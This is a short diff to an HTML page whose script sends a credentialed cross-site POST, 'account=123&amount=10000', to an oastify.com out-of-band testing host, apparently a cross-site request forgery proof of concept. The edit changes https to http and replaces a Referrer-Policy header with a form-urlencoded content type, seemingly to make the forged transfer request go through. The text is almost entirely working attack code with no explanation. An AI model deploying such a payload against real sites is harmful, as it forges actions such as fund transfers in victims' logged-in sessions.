@@ -16,10 +16,10 @@
 <html>
 <script>	
 	var xmlHttp = new XMLHttpRequest();    
-	xmlHttp.open("POST", "https://qb50dkqgugi98eqdbwkanv4m0d64uuij.oastify.com", false);
+	xmlHttp.open("POST", "http://qb50dkqgugi98eqdbwkanv4m0d64uuij.oastify.com", false);
     xmlHttp.withCredentials=true;    	
-    xmlHttp.setRequestHeader("Referrer-Policy",
-    "no-referrer");
+    xmlHttp.setRequestHeader("Content-type",
+    "application/x-www-form-urlencoded");
 	xmlHttp.send("account=123&amount=10000");
 </script>
 </html> 
